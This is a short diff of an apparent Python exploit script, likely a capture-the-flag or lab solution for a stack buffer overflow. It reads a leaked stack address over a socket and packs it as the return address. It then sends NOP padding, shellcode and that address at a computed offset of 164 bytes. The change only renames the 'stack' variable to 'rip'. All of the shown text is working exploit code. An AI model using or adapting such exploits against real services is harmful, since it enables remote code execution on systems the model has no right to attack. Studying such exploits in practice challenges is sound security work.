@@ -30,8 +30,8 @@ if ('Dump again' not in resp.decode()):
     print('Failed to get the stack address')
     exit(0)
 
-stack = resp.decode().split(':')[0]
-print('[+] Stack found: {}'.format(stack))
+rip = resp.decode().split(':')[0]
+
 
 sock.send(b'y\n')
 time.sleep(2)
@@ -48,9 +48,9 @@ offset = 164
 padding = asm('nop') * 21 
 # 21 = (offset - len(shellcode)) // len(asm('nop'))
 
-stack = struct.pack('I', int(stack, 16))
+rip = struct.pack('I', int(rip, 16))
 
-payload = padding + shellcode + stack + b'\n'
+payload = padding + shellcode + rip + b'\n'
 sock.send(payload)
 time.sleep(2)
 
